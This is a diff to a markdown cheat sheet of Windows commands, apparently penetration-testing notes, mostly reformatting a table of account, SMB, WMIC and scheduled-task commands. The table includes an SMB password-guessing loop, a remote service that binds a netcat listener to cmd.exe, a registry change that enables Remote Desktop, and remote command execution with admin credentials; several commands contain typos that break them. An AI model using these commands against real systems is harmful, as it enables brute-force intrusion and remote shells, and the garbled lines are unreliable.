@@ -6,16 +6,17 @@ order: 4
 
 >**Windows Commands**
 
-Category | Topic | Command | Example
-Accounts and Privileges | Lauch with Admin Privs | ctrl+shift+enter | 
-Accounts and Privileges | SID | S-[revision level]-[authority level]-[domain/computer]-RID | 
-Accounts and Privileges | Admin RID | 500 | 
-Accounts and Privileges | Guest RID | 501 | 
-Accounts and Privileges | Users RID | 1001 and up | 
-Accounts and Privileges | Add or Remove a User | net user [username] [password] /add or /del | termservice, telnet
-Accounts and Privileges | Add or Remove user to a group | net localgroup [group] [username] /add or /del | "Remote Desktop Users", TelnetClients, Administrators
-Accounts and Privileges | List Local Users | net user | 
-Accounts and Privileges | List Groups | net localgroup | 
+Category | Topic | Command
+Accounts and Privileges | Lauch with Admin Privs | ctrl+shift+enter 
+Accounts and Privileges | SID | S-[revision level]-[authority level]-[domain/computer]-RID
+Accounts and Privileges | Admin RID | 500
+Accounts and Privileges | Guest RID | 501 
+Accounts and Privileges | Users RID | 1001 and up
+Accounts and Privileges | Add or Remove a User | net user [username] [password] /add or /del <br> termservice, telnet
+Accounts and Privileges | Add or Remove user to a group | net localgroup [group] [username] /add or /del <br> "Remote Desktop Users", TelnetClients, Administrators
+Accounts and Privileges | List Local Users | net user
+Accounts and Privileges | List Groups | net localgroup
+
 Accounts and Privileges | List Administrators | net localgroup administrators | 
 Accounts and Privileges | List Account Policy | net accounts or net accounts /domain | 
 Accounts and Privileges | Password Guess | for /f %i in 9password.lst) do @echo %i & @net use \\[tartet_IP_addr] %i /u:[UserName] 2>nul && echo [UserName]: %i >> success.txt | 
@@ -63,7 +64,7 @@ Remote Access, SMB, and WMIC | Establish an SMB session | net use \\[targetIP] [
 Remote Access, SMB, and WMIC | Mount a Share on Target | "net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user]" | 
 Remote Access, SMB, and WMIC | Dropping SMB Session | "net use \\[targetIP] /del <br> net use * /del" | 
 
-Remote Access, SMB, and WMIC | Run a Remote Command | sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe" | 
+Remote Access, SMB, and WMIC | Run a Remote Command | sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe | 
 Remote Access, SMB, and WMIC | Turn on Remote Desktop / terminal services | reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenysconnetions /t reg_dword /d 0 | 
 Remote Access, SMB, and WMIC | Remote Registry  | Put \\[MachineName] before [KeyName] | 
 Remote Access, SMB, and WMIC | WMIC Invoke Porgram | wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] | 
@@ -72,12 +73,7 @@ Remote Access, SMB, and WMIC | WMIC Service Query | wmic services where (display
 Remote Access, SMB, and WMIC | WMIC List Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process list brief | 
 Remote Access, SMB, and WMIC | WMIC Kill Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process where name="[name]" delete or processID="[PID]" delete | 
 Remote Access, SMB, and WMIC | WMIC Monitor Process | wmic process where name="[name]" list brief /every:1 | "nc.exe"
-Remote Access, SMB, and WMIC | at (windows 7 and lower)(all commands at SYSTEM) | "net use \\[targetIP] [password] /u:[admin_user]
-sc \\[targetIP] query schedule (*make sure it is running*)
-*sc \\[targetIP] start schedule*
-at [\\targetIP] [HH:MM] [A|P] [command]
-at \\[machine] [time] cmd /c ""[command]""
-at \\[targetIP} (*check status*)" | 
+Remote Access, SMB, and WMIC | at (windows 7 and lower)(all commands at SYSTEM) | "net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" | 
 Remote Access, SMB, and WMIC | schtasksStart TIme - HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE | "> net use \\[targetIP] [password] /u:[admin_user]
 > sc \\[targetIP] query schedule (*make sure it is running*)
 > *sc \\[targetIP] start schedule*
